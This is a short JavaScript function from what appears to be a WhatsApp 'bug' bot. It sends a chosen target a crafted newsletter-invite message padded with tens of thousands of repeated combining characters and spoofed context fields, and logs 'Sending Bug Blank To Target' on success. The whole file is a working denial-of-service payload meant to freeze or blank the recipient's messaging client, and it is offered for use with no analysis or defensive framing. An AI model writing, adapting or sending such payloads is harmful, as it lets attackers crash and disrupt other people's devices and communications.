async function XProtexBlankXDelay(target) {
 try {
  const XProtex = 'ោ៝'.repeat(20000);
  const Blank = 'ꦾ'.repeat(20000);
  const msg = {
    newsletterAdminInviteMessage: {
    newsletterJid: "1234567891234@newsletter",
    newsletterName: "XProtex" + "ោ៝".repeat(20000),
    caption: "XProtex Here Bro" + XProtex + Blank + "ោ៝".repeat(20000),
    inviteExpiration: "90000",
    contextInfo: {
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  };
  
  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
   console.log(chalk.red.bold(`Succes Sending Bug Blank To Target ${target}`));
 } catch (err) {
    console.error("Gagal Mengirim Bug", err);
  }
}